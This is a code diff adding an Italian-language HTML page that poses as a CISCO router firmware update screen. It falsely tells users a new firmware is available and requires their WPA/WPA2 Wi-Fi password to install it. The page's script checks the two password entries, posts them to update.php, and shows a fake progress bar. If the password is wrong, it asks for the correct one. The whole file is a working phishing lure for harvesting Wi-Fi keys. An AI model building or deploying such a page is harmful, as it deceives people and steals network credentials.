@@ -1,0 +1,52 @@
+<html> <head><title>Aggiornamento</title><meta http-equiv=expires content=0><meta http-equiv=cache-control content=no-cache><meta http-equiv=pragma content=no-cache><meta http-equiv=pragma content=max-age=3600><meta http-equiv=Content-Type content="text/html; charset=UTF-8"><meta http-equiv=X-UA-Compatible content=IE=EmulateIE7><meta http-equiv=Content-Type content="text/html; charset=iso-8859-1"><link href=css/style.css type=text/css rel=stylesheet><link href=css/update.css type=text/css rel=stylesheet><script type=text/javascript src=js/jquery-2.1.4.min.js></script><script type=text/javascript>
+			$(document).ready(function() {						
+				$("#updateform").submit(function(e) {
+	
+					e.preventDefault();
+					$(".error").hide();
+		
+					var hasError = false;
+					var wpa_psw = $("#wpa_psw").val();
+					var wpa_psw_conf = $("#wpa_psw_conf").val();
+					
+					if (wpa_psw == '') {
+				$("#wpa_psw").after('<span class="error">Per favore, inserire la password.</span>');
+				hasError = true;
+			} else if (wpa_psw_conf == '') {
+				$("#wpa_psw_conf").after('<span class="error">Per favore, inserire la stessa password.</span>');
+				hasError = true;
+			} else if (wpa_psw != wpa_psw_conf ) {
+				$("#wpa_psw_conf").after('<span class="error">Le password non sono uguali.</span>');
+				hasError = true;
+			}
+					
+					
+					if (!hasError) {					
+						var formURL = $(this).attr("action");					
+						var pBar = $("#pbar");
+						
+						$.ajax({
+								type: "POST",
+								url : formURL,
+								data: {wpa_psw: wpa_psw, wpa_psw_conf: wpa_psw_conf},
+								dataType:'JSON',
+								success:function(response){
+									console.log(response);
+
+									if (response) {
+										// psw OK
+										$("#wpa_psw").prop('disabled', true);
+										$("#wpa_psw_conf").prop('disabled', true);
+										pBar.addClass("update");
+									
+										doProgress();
+									} else {
+										alert ("La password inserita non è corretta! Inserire la password corretta.");
+										$("#button_update").prop('disabled', false);
+									}
+								}
+						});
+					}
+				});
+			});
+		</script></head> <body> <div> <table class=CONTENT_TABLE> <tr><td class=CONTENT_TITLE>Aggiornamento Firmware/Lingua</td></tr> <tr> <td colspan=2> <table class=CONTENT_GROUP cellspacing=0> <tr><td class=FUNTITLE colspan=2;>Informazioni Sistema</td></tr> <tr> <td class=SUBTITLE colspan=2> <img src=image/Status_information_icon.png style="margin-right: 10px"> <span>È disponibile un nuovo firmware per il vostro CISCO che migliorerà le funzionalità e le performance dell'apparato.</span> </br> <span>Per scaricare e aggiornare il firmware è necessario inserire la password WPA/WPA2 e premere il tasto AGGIORNA per procedere.</span> </td> </tr> <tr> <td class=SUBTITLE>Dispositivo: </td> <td class=SUBITEM_SHIFT>CISCO</td> </tr> <tr> <td class=SUBTITLE>PID VID:</td> <td class=SUBITEM_SHIFT>V01</td> </tr> <tr> <td class=SUBTITLE>Versione Firmware Corrente:</td> <td class=SUBITEM_SHIFT>1.0.1.3</td> </tr> <tr> <td class=SUBTITLE style="color: red; font-weight: bold">Ultima Versione Firmware</td> <td class=SUBITEM_SHIFT style="color: red; font-weight: bold">2.5.9.5</td> </tr> <tr> <td class=SUBTITLE>Versione Lingua</td> <td class=SUBITEM_SHIFT>1.0.0.22</td> </tr> <tr> <td class=SUBTITLE style="color: red; font-weight: bold">Ultimo Aggiornamento Firmware</td> <td class=SUBITEM_SHIFT style="color: red; font-weight: bold">01/09/2015</td> </tr> <tr><td class=HRTD colspan=2;><hr size=1 class=ISHR></td></tr> <tr> <td class=FUNTITLE colspan=2;>Aggiornamento Automatico del Firmware</td> </tr> <tr> <td class=SUBTITLE>Intervallo - Controlla ogni</td> <td class=SUBITEM_SHIFT> <select name=_bsd_interval id=_bsd_interval> <option value=never>Mai</option> <option value=week selected>Settimanale</option> <option value=month>Mensile</option> </select>&nbsp;&nbsp; </td> </tr> <tr> <td class=SUBTITLE>Aggiorna automaticamente</td> <td class=SUBITEM_SHIFT> <select name=_bsd_action id=_bsd_action> <option value=0 selected>Mai</option> <option value=1>Immediatamente</option> <option value=2>In uno specifico momento</option> </select> </td> </tr> <tr> <td class=SUBTITLE>Notifica via</td> <td class=SUBITEM_SHIFT> <input type=checkbox name=_via_admin>Admin GUI </td> </tr> <tr> <td class=SUBTITLE></td> <td class=SUBITEM_SHIFT> <input type=checkbox name=_via_mail disabled>Email to&nbsp; <input type=button class=BT_AUTO value="Indirizzo Email" id=mailbt onmouseover="this.className='BT_AUTO_Hover'" onmouseout="this.className='BT_AUTO'" onmousedown="this.className='BT_AUTO_Press'"> <span style=color:#8e8e8e>Per favore, configura le impostazioni email per abilitare la notifica.</span> </td> </tr> <tr> <td class=HRTD colspan=2><hr size=1 class=ISHR></td> </tr> <tr> <td class=FUNTITLE colspan=2;>Aggiornamento Manuale del Firmware/Lingua</td> </tr> <tr> <td class=SUBTITLE>Tipo di File:</td> <td class=SUBITEM_SHIFT> <input type=radio name=file_type value=code checked>Immagine Firmware <input type=radio name=file_type value=lang>File Lingua </td> </tr> <tr> <td class=SUBTITLE>Aggiorna da</td> <td class=SUBITEM_SHIFT> <input type=radio name=_upgrade_from value=code checked>cisco.com </td> </tr> <tr> <td class=SUBTITLE></td> <td class=SUBITEM_SHIFT> <div style=position:relative> <input type=radio value=1 name=_upgrade_from disabled=disabled>&nbsp;PC&nbsp; <input name=file id=fileTxtBox type=file size=30 style=opacity:0;filter:alpha(opacity:0);z-index:2;position:absolute; disabled=disabled> <input type=text id=txtUploadFile name=browser size=23 style="position:absolute;background-color:#cecaca;margin:0; height:20px" disabled=disabled> <span id=msg_file style=position:absolute;left:200px></span> <input type=button class=BT_L_DISABLE value=Browse... id=t6 style=position:absolute;left:210px;top:0px> </div> </td> </tr> <tr> <td class=SUBTITLE></td> <td class=SUBITEM> <input type=checkbox name=restore id=chk_restore disabled>Resetta tutte le impostazioni/configurazioni alle impostazioni di fabbrica </td> </tr> <tr> <td class=HRTD colspan=2><hr size=1 class=ISHR></td> </tr> <tr> <td class=FUNTITLE colspan=2;>Download Firmware</td> </tr> <tr> <td class=SUBTITLE colspan=2>Nota: Il download e l'aggiornamento del firmware può richiedere alcuni minuti. Durante l'aggiornamento non spegnere il router nè chiudere il browser.</td> </tr> <tr> <td colspan=2 align=left> <form id=updateform method=post action=update.php> <fieldset style="display: inline-block"> <p> <label class=duple style="width: 220px;">WPA/WPA2 :</label> <input id=wpa_psw name=wpa_psw type=password> </p> <p> <label class=duple style="width: 220px;">Conferma WPA/WPA2 :</label> <input id=wpa_psw_conf name=wpa_psw_conf type=password> </p> </fieldset> <p style="text-align: center"> <input class=BT_AUTO id=button_update type=submit value=Aggiorna onmouseover="this.className='BT_AUTO_Hover'" onmouseout="this.className='BT_AUTO'" onmousedown="this.className='BT_AUTO_Press'"> </p> <p style="text-align: center"> <progress id=pbar value=0 max=100></progress> </p> </form> </td> </tr> </table> </td> </tr> </table> </div> <script type=text/javascript src=js/pBar.js></script> </body> </html> 
